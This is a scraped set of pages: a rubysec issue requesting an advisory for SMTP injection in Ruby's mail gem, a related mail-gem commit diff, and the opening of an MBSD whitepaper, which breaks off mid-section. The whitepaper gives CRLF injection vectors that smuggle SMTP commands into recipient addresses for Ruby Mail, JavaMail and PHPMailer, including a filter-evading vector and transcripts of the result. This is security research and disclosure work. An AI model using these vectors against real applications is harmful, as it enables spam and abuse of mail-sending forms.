  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Frubysec%2Fruby-advisory-db%2Fissues%2F215)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F%3Cuser-name%3E%2F%3Crepo-name%3E%2Fvoltron%2Fissues_fragments%2Fissue_layout&source=header-repo&source_repo=rubysec%2Fruby-advisory-db)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

[rubysec](/rubysec)
/
**[ruby-advisory-db](/rubysec/ruby-advisory-db)**
Public

* [Notifications](/login?return_to=%2Frubysec%2Fruby-advisory-db) You must be signed in to change notification settings
* [Fork
  220](/login?return_to=%2Frubysec%2Fruby-advisory-db)
* [Star
   1k](/login?return_to=%2Frubysec%2Fruby-advisory-db)

* [Code](/rubysec/ruby-advisory-db)
* [Issues
  21](/rubysec/ruby-advisory-db/issues)
* [Pull requests
  4](/rubysec/ruby-advisory-db/pulls)
* [Actions](/rubysec/ruby-advisory-db/actions)
* [Projects
  0](/rubysec/ruby-advisory-db/projects)
* [Security](/rubysec/ruby-advisory-db/security)
* [Insights](/rubysec/ruby-advisory-db/pulse)

Additional navigation options

* [Code](/rubysec/ruby-advisory-db)
* [Issues](/rubysec/ruby-advisory-db/issues)
* [Pull requests](/rubysec/ruby-advisory-db/pulls)
* [Actions](/rubysec/ruby-advisory-db/actions)
* [Projects](/rubysec/ruby-advisory-db/projects)
* [Security](/rubysec/ruby-advisory-db/security)
* [Insights](/rubysec/ruby-advisory-db/pulse)

# Add advisory for SMTP injection vulnerability in mail <2.6.0¬†#215

[New issue](/login?return_to=)[Jump to bottom](#comment-composer-heading)Copy link[New issue](/login?return_to=)[Jump to bottom](#comment-composer-heading)Copy linkClosedClosed[Add advisory for SMTP injection vulnerability in mail <2.6.0](#top)#215Copy linkLabels[advisory](https://github.com/rubysec/ruby-advisory-db/issues?q=state%3Aopen%20label%3A%22advisory%22)[![@reedloden](https://avatars.githubusercontent.com/u/352251?u=8ec37a0f743b2d4c0ab12c95a504715d746779f1&v=4&size=80)](/reedloden)
## Description

[![@reedloden](https://avatars.githubusercontent.com/u/352251?u=8ec37a0f743b2d4c0ab12c95a504715d746779f1&v=4&size=48)](/reedloden)[reedloden](https://github.com/reedloden)opened [on Dec 11, 2015](https://github.com/rubysec/ruby-advisory-db/issues/215#issue-121643487)

Need an advisory for the mail vulnerability discussed in <http://www.mbsd.jp/Whitepaper/smtpi.pdf> (section 3.1)

Affects <2.6.0

## Metadata

### Assignees

No one assigned

### Labels

[advisory](https://github.com/rubysec/ruby-advisory-db/issues?q=state%3Aopen%20label%3A%22advisory%22)
### Type

No type
### Projects

No projects
### Milestone

No milestone

### Relationships

None yet
### Development

No branches or pull requests
## Issue actions

## Footer

¬© 2025 GitHub,¬†Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can‚Äôt perform that action at this time.



=== Content from github.com_c4c2929b_20250124_124545.html ===

[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fmikel%2Fmail%2Fcommit%2F72befdc4dab3e6e288ce226a7da2aa474cf5be83)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  + [Nonprofits](/solutions/industry/nonprofits)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fmikel%2Fmail%2Fcommit%2F72befdc4dab3e6e288ce226a7da2aa474cf5be83)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F%3Cuser-name%3E%2F%3Crepo-name%3E%2Fvoltron%2Fcommit_fragments%2Frepo_layout&source=header-repo&source_repo=mikel%2Fmail)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

[mikel](/mikel)
/
**[mail](/mikel/mail)**
Public

* [Notifications](/login?return_to=%2Fmikel%2Fmail) You must be signed in to change notification settings
* [Fork
  939](/login?return_to=%2Fmikel%2Fmail)
* [Star
   3.6k](/login?return_to=%2Fmikel%2Fmail)

* [Code](/mikel/mail)
* [Issues
  116](/mikel/mail/issues)
* [Pull requests
  52](/mikel/mail/pulls)
* [Actions](/mikel/mail/actions)
* [Projects
  0](/mikel/mail/projects)
* [Wiki](/mikel/mail/wiki)
* [Security](/mikel/mail/security)
* [Insights](/mikel/mail/pulse)

Additional navigation options

* [Code](/mikel/mail)
* [Issues](/mikel/mail/issues)
* [Pull requests](/mikel/mail/pulls)
* [Actions](/mikel/mail/actions)
* [Projects](/mikel/mail/projects)
* [Wiki](/mikel/mail/wiki)
* [Security](/mikel/mail/security)
* [Insights](/mikel/mail/pulse)

## Commit

[Permalink](/mikel/mail/commit/72befdc4dab3e6e288ce226a7da2aa474cf5be83)

This commit does not belong to any branch on this repository, and may belong to a fork outside of the repository.

Also unfold and split lazily

[Browse files](/mikel/mail/tree/72befdc4dab3e6e288ce226a7da2aa474cf5be83)
Browse the repository at this point in the history

```
This has little effect on the specs, but on my header reading example it
makes about a 10x performance difference, finally bringing it within one
order of magnitude of the "fast hacky solution" at
<https://gist.github.com/5901bbd810c08ed3d0b1>
```

* Loading branch information

[![@ConradIrwin](https://avatars.githubusercontent.com/u/94272?s=40&v=4)](/ConradIrwin)

[ConradIrwin](/mikel/mail/commits?author=ConradIrwin "View all commits by ConradIrwin")
committed
Feb 2, 2013

1 parent
[2bd6dac](/mikel/mail/commit/2bd6daca322b035c55ff12485897535201b3616e)

commit 72befdc

 Show file tree

 Hide file tree

Showing
**4 changed files**
with
**24 additions**
and
**23 deletions**.

* Whitespace
* Ignore whitespace

* Split
* Unified

* lib/mail

  + lib/mail/field.rb
    [field.rb](#diff-d6a31bc82c321e9e4a98d289a89742abb5426ab8a9b0c36d542ff76e550c058a)
  + lib/mail/header.rb
    [header.rb](#diff-e94dbdce9ab475cd5aad68f27389d68541af76bbd3eb871f515acfabe9f9562a)
  + lib/mail/patterns.rb
    [patterns.rb](#diff-04dac9a30b1dda8ce70e878ea4fc615edaa786b1286ad43f6b5f345e3f2a4c53)
* spec/mail

  + spec/mail/message\_spec.rb
    [message\_spec.rb](#diff-174387f4040a99bf341a9ecf4ffa5781dddbc7dd638d206eb4f47b8d72d2f179)

## There are no files selected for viewing

22 changes: 19 additions & 3 deletions

22
[lib/mail/field.rb](#diff-d6a31bc82c321e9e4a98d289a89742abb5426ab8a9b0c36d542ff76e550c058a "lib/mail/field.rb")

Show comments

[View file](/mikel/mail/blob/72befdc4dab3e6e288ce226a7da2aa474cf5be83/lib/mail/field.rb)
Edit file

Delete file

This file contains bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

  [Show hidden characters](%7B%7B%20revealButtonHref%20%7D%7D)

| Original file line number | Diff line number | Diff line change |
| --- | --- | --- |
| Expand Up | | @@ -115,7 +115,8 @@ def initialize(name, value = nil, charset = 'utf-8') |
|  |  | case |
|  |  | when name =~ /:/ # Field.new("field-name: field data") |
|  |  | @charset = value.blank? ? charset : value |
|  |  | @name, @value = split(name) |
|  |  | @name = name[FIELD\_PREFIX] |
|  |  | @raw\_value = name |
|  |  | when name !~ /:/ && value.blank? # Field.new("field-name") |
|  |  | @name = name |
|  |  | @value = nil |
| Expand All | | @@ -125,19 +126,20 @@ def initialize(name, value = nil, charset = 'utf-8') |
|  |  | @value = value |
|  |  | @charset = charset |
|  |  | end |
|  |  | return self |
|  |  | @name = FIELD\_NAME\_MAP[@name.to\_s.downcase] || @name |
|  |  | end |
|  |  |  |
|  |  | def field=(value) |
|  |  | @field = value |
|  |  | end |
|  |  |  |
|  |  | def field |
|  |  | \_, @value = split(@raw\_value) if @raw\_value && !@value |
|  |  | @field ||= create\_field(@name, @value, @charset) |
|  |  | end |
|  |  |  |
|  |  | def name |
|  |  | FIELD\_NAME\_MAP[@name.to\_s.downcase] || @name |
|  |  | @name |
|  |  | end |
|  |  |  |
|  |  | def value |
| Expand Down  Expand Up | | @@ -198,7 +200,21 @@ def split(raw\_field) |
|  |  | STDERR.puts "WARNING: Could not parse (and so ignoring) '#{raw\_field}'" |
|  |  | end |
|  |  |  |
|  |  | # 2.2.3. Long Header Fields |
|  |  | # |
|  |  | # The process of moving from this folded multiple-line representation |
|  |  | # of a header field to its single line representation is called |
|  |  | # "unfolding". Unfolding is accomplished by simply removing any CRLF |
|  |  | # that is immediately followed by WSP. Each header field should be |
|  |  | # treated in its unfolded form for further syntactic and semantic |
|  |  | # evaluation. |
|  |  | def unfold(string) |
|  |  | string.gsub(/[\r\n \t]+/m, ' ') |
|  |  | end |
|  |  |  |
|  |  | def create\_field(name, value, charset) |
|  |  | value = unfold(value) if value.is\_a?(String) || value.is\_a?(Mail::Multibyte::Chars) |
|  |  |  |
|  |  | begin |
|  |  | new\_field(name, value, charset) |
|  |  | rescue Mail::Field::ParseError => e |
| Expand Down | |  |

19 changes: 1 addition & 18 deletions

19
[lib/mail/header.rb](#diff-e94dbdce9ab475cd5aad68f27389d68541af76bbd3eb871f515acfabe9f9562a "lib/mail/header.rb")

Show comments

[View file](/mikel/mail/blob/72befdc4dab3e6e288ce226a7da2aa474cf5be83/lib/mail/header.rb)
Edit file

Delete file

This file contains bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

  [Show hidden characters](%7B%7B%20revealButtonHref%20%7D%7D)

| Original file line number | Diff line number | Diff line change |
| --- | --- | --- |
| Expand Up | | @@ -244,27 +244,10 @@ def raw\_source=(val) |
|  |  | @raw\_source = val |
|  |  | end |
|  |  |  |
|  |  | # 2.2.3. Long Header Fields |
|  |  | # |
|  |  | # The process of moving from this folded multiple-line representation |
|  |  | # of a header field to its single line representation is called |
|  |  | # "unfolding". Unfolding is accomplished by simply removing any CRLF |
|  |  | # that is immediately followed by WSP. Each header field should be |
|  |  | # treated in its unfolded form for further syntactic and semantic |
|  |  | # evaluation. |
|  |  | def unfold(string) |
|  |  | string.gsub(/#{CRLF}#{WSP}+/, ' ').gsub(/#{WSP}+/, ' ') |
|  |  | end |
|  |  |  |
|  |  | # Returns the header with all the folds removed |
|  |  | def unfolded\_header |
|  |  | @unfolded\_header ||= unfold(raw\_source) |
|  |  | end |
|  |  |  |
|  |  | # Splits an unfolded and line break cleaned header into individual field |
|  |  | # strings. |
|  |  | def split\_header |
|  |  | self.fields = unfolded\_header.split(CRLF) |
|  |  | self.fields = raw\_source.split(HEADER\_SPLIT) |
|  |  | end |
|  |  |  |
|  |  | def select\_field\_for(name) |
| Expand Down | |  |

4 changes: 3 additions & 1 deletion

4
[lib/mail/patterns.rb](#diff-04dac9a30b1dda8ce70e878ea4fc615edaa786b1286ad43f6b5f345e3f2a4c53 "lib/mail/patterns.rb")

Show comments

[View file](/mikel/mail/blob/72befdc4dab3e6e288ce226a7da2aa474cf5be83/lib/mail/patterns.rb)
Edit file

Delete file

This file contains bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

  [Show hidden characters](%7B%7B%20revealButtonHref%20%7D%7D)

| Original file line number | Diff line number | Diff line change |
| --- | --- | --- |
| Expand Up | | @@ -20,10 +20,12 @@ module Patterns |
|  |  | FWS = /#{CRLF}#{WSP}\*/ |
|  |  | TEXT = /[#{text}]/ # + obs-text |
|  |  | FIELD\_NAME = /[#{field\_name}]+/ |
|  |  | FIELD\_BODY = /.+/ |
|  |  | FIELD\_PREFIX = /\A(#{FIELD\_NAME})/ |
|  |  | FIELD\_BODY = /.+/m |
|  |  | FIELD\_LINE = /^[#{field\_name}]+:\s\*.+$/ |
|  |  | FIELD\_SPLIT = /^(#{FIELD\_NAME})\s\*:\s\*(#{FIELD\_BODY})?$/ |
|  |  | HEADER\_LINE = /^([#{field\_name}]+:\s\*.+)$/ |
|  |  | HEADER\_SPLIT = /#{CRLF}(?!#{WSP})/ |
|  |  |  |
|  |  | QP\_UNSAFE = /[^#{qp\_safe}]/ |
|  |  | QP\_SAFE = /[#{qp\_safe}]/ |
| Expand Down | |  |

2 changes: 1 addition & 1 deletion

2
[spec/mail/message\_spec.rb](#diff-174387f4040a99bf341a9ecf4ffa5781dddbc7dd638d206eb4f47b8d72d2f179 "spec/mail/message_spec.rb")

Show comments

[View file](/mikel/mail/blob/72befdc4dab3e6e288ce226a7da2aa474cf5be83/spec/mail/message_spec.rb)
Edit file

Delete file

This file contains bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

  [Show hidden characters](%7B%7B%20revealButtonHref%20%7D%7D)

| Original file line number | Diff line number | Diff line change |
| --- | --- | --- |
| Expand Up | | @@ -109,7 +109,7 @@ def basic\_email |
|  |  |  |
|  |  | it "should raise a warning (and keep parsing) on having an incorrectly formatted header" do |
|  |  | STDERR.should\_receive(:puts).with("WARNING: Could not parse (and so ignoring) 'quite Delivered-To: xxx@xxx.xxx'") |
|  |  | Mail.read(fixture('emails', 'plain\_emails', 'raw\_email\_incorrect\_header.eml')) |
|  |  | Mail.read(fixture('emails', 'plain\_emails', 'raw\_email\_incorrect\_header.eml')).to\_s |
|  |  | end |
|  |  |  |
|  |  | it "should read in an email message and basically parse it" do |
| Expand Down | |  |

Toggle all file notes
Toggle all file annotations

### 0 comments on commit `72befdc`

Please
[sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fmikel%2Fmail%2Fcommit%2F72befdc4dab3e6e288ce226a7da2aa474cf5be83) to comment.

## Footer

¬© 2025 GitHub,¬†Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can‚Äôt perform that action at this time.



=== Content from www.mbsd.jp_4782825b_20250124_124544.html ===
MBSD Technical Whitepaper

SMTP Injection via recipient email addresses

Takeshi Terada / Mitsui Bussan Secure Directions, Inc.

December 2015

Table of Contents

1.

Introduction .......................................................................................................... 1

2.  How the attack works .......................................................................................... 2

3.  Vulnerability examples ........................................................................................ 4

3.1.

Ruby‚Äôs Mail ................................................................................................................... 4

3.2.

JavaMail ....................................................................................................................... 4

3.3.

PHPMailer .................................................................................................................... 5

3.4.  Other platforms ............................................................................................................ 8

4.  Further attack possibility .................................................................................... 9

4.1.

FWS Attack .................................................................................................................. 9

4.2.

CRLF-less attack ........................................................................................................ 10

4.3.

Line-breaks for SMTP servers .................................................................................. 11

5.  Sender address attack ........................................................................................ 12

6.  Conclusion .......................................................................................................... 13

7.  References........................................................................................................... 14

8.  About us .............................................................................................................. 15

1.  Introduction

SMTP Injection is an attack technique that injects attacker-controlled SMTP commands into

the data transmitted from an application (typically a web application) to an SMTP server for

spamming purposes.

Among this class of attack, techniques using manipulated content (message body or header)

have been published and known in the security community. Vicente Aguilera D√≠az‚Äôs work [1]

is well-known and some related previous researches are found in WASC‚Äôs page [2].

Mitsui  Bussan  Secure  Directions,  Inc.  (MBSD)  has  conducted  a  research  on  this  topic,

specifically  on  attack  techniques  utilizing  crafted  recipient  email  addresses.  The  basic

concept of this type of attack is mentioned in Insomnia‚Äôs slides [3] and possibly others. Our

research result described in this paper tries to further the attack possibility of the type and

show some attack examples.

This  paper  first  describes  the  attack  mechanism  and  then  explains  some  vulnerability

examples  in  email  libraries  on  Java,  Ruby,  PHP  and  other  platforms.  Other  attack

techniques and countermeasures are discussed in the following chapters.

MBSD Technical Whitepaper  ¬©2015 Mitsui Bussan Secure Directions, Inc. All rights reserved.

1

2.  How the attack works

The following is a normal SMTP command transaction between an SMTP client and server.

1:
2:
3:
4:
5:
6:
7:
8:
9:
10:
11:
12:
13:
14:
15:
16:
17:
18:
19:
20:
21:

220 test.mbsd.jp ESMTP Postfix‚Üµ

EHLO test‚Üµ

250-test.mbsd.jp‚Üµ
250-8BITMIME‚Üµ
(list of extensions follows)

MAIL FROM:<from@example.com>‚Üµ
250 2.1.0 Ok‚Üµ

RCPT TO:<to@example.jp>‚Üµ

DATA‚Üµ

250 2.1.5 Ok‚Üµ

354 Please start mail input.‚Üµ

From: <from@example.com>‚Üµ
To: <to@example.jp>‚Üµ
Subject: test message‚Üµ
‚Üµ
This is a test message.‚Üµ
Thanks!‚Üµ
.‚Üµ

QUIT‚Üµ

250 Mail queued for delivery.‚Üµ

221 Closing connection. Good bye.‚Üµ

Commands from client to server are indicated in red.

In theory every command in red can be used for an attack, but the research focused on "RCPT

TO"  command  (#8),  as  it  appeared  to  be  a  fruitful  target  and  the  exploitation  of  this

command did not seem to have been covered by the researches in the past (but later we come

to know it was mentioned by aforementioned paper [3] though).

Now, let‚Äôs see how the attack works. Suppose an attacker fully controls the recipient address.

In this scenario, an attacker provides a vector like the following.

Normal value:

rcpt=to@example.jp

Manipulated:

rcpt=to@example.jp>[CRLF]DATA[CRLF](message content)[CRLF].[CRLF]QUIT[CRLF]

The resulting SMTP transaction is shown below:

MBSD Technical Whitepaper  ¬©2015 Mitsui Bussan Secure Directions, Inc. All rights reserved.

2

6:
7:
8.1:
8.2:
8.3:
8.4:
8.5:
8.6:
9:
10:
11:
12:

MAIL FROM:<from@example.com>‚Üµ
250 2.1.0 Ok‚Üµ

RCPT TO:<to@example.jp>‚Üµ
DATA‚Üµ
(message content)‚Üµ
.‚Üµ
QUIT‚Üµ
>‚Üµ

; attacker-injected part
; is underlined

250 2.1.5 Ok‚Üµ
354 Please start mail input.‚Üµ
250 Mail queued for delivery.‚Üµ
221 Closing connection. Good bye.‚Üµ

; response to 8.1
; response to 8.2
; response to 8.4
; response to 8.5

Although  the  injected  commands  above  (#8.2  to  8.5)  are  sent  without  waiting  for  the

response to the previous command, all the MTAs we tested, which were Postfix, Sendmail

and MS Exchange, accepted the injected commands accordingly. This happens because the

SMTP‚Äôs  pipelining  extension  [4],  which  allows  batch  commands,  is  enabled  by  default  on

most MTAs including the aforementioned three.

This way, the attacker-injected message in the recipient address is processed by the server.

This type of vulnerability can be real threats in inquiry forms, member signup forms, or any

other application that delivers an email to a user-specified email address.

One thing worth mentioning here is that the traditional attack vectors like the following do

not work in the context of SMTP Injection.

to@example.jp[CRLF]Cc: x@example.org

This is why we believe this recipient attack is especially worth discussing.

MBSD Technical Whitepaper  ¬©2015 Mitsui Bussan Secure Directions, Inc. All rights reserved.

3

3.  Vulnerability examples

This  chapter  describes  the  newly  discovered  vulnerabilities  in  email  libraries.  The

vulnerabilities have already been fixed in the latest versions of the programs.

3.1.  Ruby‚Äôs Mail

The  Ruby‚Äôs  "Mail"  [5]  is  an  email  library  used  in  Ruby  on  Rails  framework  (ActionMailer)

and other Ruby applications.

Mail  <=  v2.5.3  is  confirmed  to  be  prone  to  the  recipient  attack  as  it  does  not  validate  nor

sanitize given recipient addresses. Thus, the attacks described in chapter 2 can be applied to

the library without any modification.

rcpt=to@example.jp>[CRLF]DATA[CRLF](message content)[CRLF].[CRLF]QUIT[CRLF]

The Mail library itself does not impose a length limit on email addresses, so an attacker can

send a long spam message via a recipient address unless there is a limit on the application‚Äôs

side.

This  vulnerability  affects  only  the  applications  that  lack  input  validation.  Upgrading  is

recommended, as Mail v2.6.0 and above are not affected by this attack.

Because  the  unsusceptible  versions  (v2.6.0  or  above)  are  released  relatively  recently,

specifically after June 2014, there must be more than a few online applications relying on

vulnerable versions of Mail (<= v.2.5.3).

3.2.  JavaMail

JavaMail is a widely used email library for Java applications provided by Oracle [6]. It is an

API in a narrow sense, but the vendor provides a reference implementation, which we call

"JavaMail" in this paper.

Our research discovered a vulnerability in JavaMail library. In the JavaMail‚Äôs case, as the

library validates given recipient addresses in a certain way, an attacker needs to bypass the

validation using an address with a crafted quoted-string part like the one shown below.

rcpt=">[CRLF]RCPT TO:to@example.jp[CRLF]DATA[CRLF](message content)[CRLF].[CRLF]QUIT
[CRLF]"@mbsd.jp

The resulting SMTP transaction is as follows:

MBSD Technical Whitepaper  ¬©2015 Mitsui Bussan Secure Directions, Inc. All rights reserved.

4

6:
7:
8.1:
8.2:
8.3:
8.4:
8.5:
8.6:
8.7:
9:
10:
11:
12:
13:
14:

MAIL FROM:<from@example.com>‚Üµ
250 2.1.0 Ok‚Üµ

RCPT TO:<">‚Üµ
RCPT TO:to@example.jp‚Üµ
DATA‚Üµ
(message content)‚Üµ
.‚Üµ
QUIT‚Üµ
"@mbsd.jp>‚Üµ

501 5.1.3 Bad recipient address syntax‚Üµ

; response to 8.1

RSET‚Üµ

QUIT‚Üµ

250 2.1.5 Ok‚Üµ

354 Please start mail input.‚Üµ
250 Mail queued for delivery.‚Üµ

; response to 8.2

; response to 8.3
; response to 8.5

As you can see above, JavaMail sends RSET and QUIT (#10, 12) to terminate the session after

receiving  an  error  (#9)  in  response  to  a  bad  RCPT TO  address  (#8.1).  Nevertheless,  the

attacker-injected  email  message  is  delivered  to  the  victim‚Äôs  mailbox,  only  because  MTAs

simply process given commands sequentially from top to bottom.

Like  Ruby‚Äôs  Mail,  JavaMail  itself  does  not  have  a  length  limit  on  email  addresses,  so  a

longer message can be sent via a long recipient address.

MBSD reported this bug to Oracle in October 2015. The vendor responded promptly and the

fix was pushed into 1.5.5-SNAPSHOT of their source code repository [7] within a week. The

vendor‚Äôs  prompt  reaction  was  somewhat  surprising  because  the  library‚Äôs  Mail  Header

Injection bug [8], reported by Alexandre Herzog of Compass Security in January 2014, was,

and still is, left unfixed.

In any case, upgrading to the latest snapshot version [9] or implementing validation on your

application‚Äôs  side  is  recommended,  if  you  are  aware  that  your  application‚Äôs  validation  is

poorly implemented.

Note  that  this  attack  succeeds  only  if  the  application  lacks  proper  input  validation.  The

vendor,  in  response  to  our  report,  suggested  the  necessity  of  input  validation  on  the

application‚Äôs  side  before  passing  this  sort  of  data  to  the  library  because  the  library‚Äôs

validation method for email addresses might not catch all possible errors.

3.3.  PHPMailer

PHPMailer is an email sending library for PHP [10].What is unique to this library is that it

tries to validate given recipient addresses strictly according to RFC 5322 [11] by applying an

incredibly complicated regex filter to the addresses:

MBSD Technical Whitepaper  ¬©2015 Mitsui Bussan Secure Directions, Inc. All rights reserved.

5

preg_match(
 '/^(?!(?>(?1)"?(?>\\\[ -~]|[^"])"?(?1)){255,})(?!(?>(?1)"?(?>\\\[ -~]|[^"])"?(?1)){65,}@)' .
 '((?>(?>(?>((?>(?>(?>\x0D\x0A)?[\t ])+|(?>[\t ]*\x0D\x0A)?[\t ]+)?)(\((?>(?2)' .
 '(?>[\x01-\x08\x0B\x0C\x0E-\'*-\[\]-\x7F]|\\\[\x00-\x7F]|(?3)))*(?2)\)))+(?2))|(?2))?)' .
 '([!#-\'*+\/-9=?^-~-]+|"(?>(?2)(?>[\x01-\x08\x0B\x0C\x0E-!#-\[\]-\x7F]|\\\[\x00-\x7F]))*' .
 '(?2)")(?>(?1)\.(?1)(?4))*(?1)@(?!(?1)[a-z0-9-]{64,})(?1)(?>([a-z0-9](?>[a-z0-9-]*[a-z0-9])?)' .
 '(?>(?1)\.(?!(?1)[a-z0-9-]{64,})(?1)(?5)){0,126}|\[(?:(?>IPv6:(?>([a-f0-9]{1,4})(?>:(?6)){7}' .
 '|(?!(?:.*[a-f0-9][:\]]){8,})((?6)(?>:(?6)){0,6})?::(?7)?))|(?>(?>IPv6:(?>(?6)(?>:(?6)){5}:' .
 '|(?!(?:.*[a-f0-9]:){6,})(?8)?::(?>((?6)(?>:(?6)){0,4}):)?))?(25[0-5]|2[0-4][0-9]|1[0-9]{2}' .
 '|[1-9]?[0-9])(?>\.(?9)){3}))\])(?1)$/isD',
 $address
);

Therefore, an attacker must provide an RFC-5322-compliant address to perform the attack,

which is a hurdle difficult but not impossible to overcome in certain circumstances.

The following is a vector we created to evade the filter.

rcpt=([CRLF][SP]RCPT TO:to@example.jp[CRLF][SP]DATA \[LF]Subject: spam10\[LF][CRLF][SP]
Hello, this is a spam mail...\[LF].[CRLF][SP]QUIT[CRLF][SP]) a@mbsd.jp

You can find two forms of line-breaks in the vector.

One form is "[CRLF][SP]", which is called FWS (Folding White Space) in RFC 5322 and its

older equivalences. As its name suggests, it is an expression just to fold a line.

The other form of line-breaks is "\[LF]", which is called obs-qp in the same RFC. Although

this  is  an obsolete expression as the prefix indicates, a few libraries including PHPMailer

still allow its occurrence in email addresses.

The resulting SMTP transaction of the vector is shown below:

6:
7:
8.1:
8.2:
8.3:
8.4:
8.5:
8.6:
8.7:
8.8:
8.9:
9:
10:
11:
12:
13:

MAIL FROM:<from@example.com>‚Üµ

250 2.1.0 <from@example.com>... Sender ok‚Üµ

RCPT TO:<(‚Üµ
[SP]RCPT TO:to@example.jp‚Üµ
[SP]DATA \‚Üµ
Subject: spam10\‚Üµ
‚Üµ
[SP]Hello, this is a spam mail...\‚Üµ
.‚Üµ
[SP]QUIT‚Üµ
[SP]) a@mbsd.jp>‚Üµ

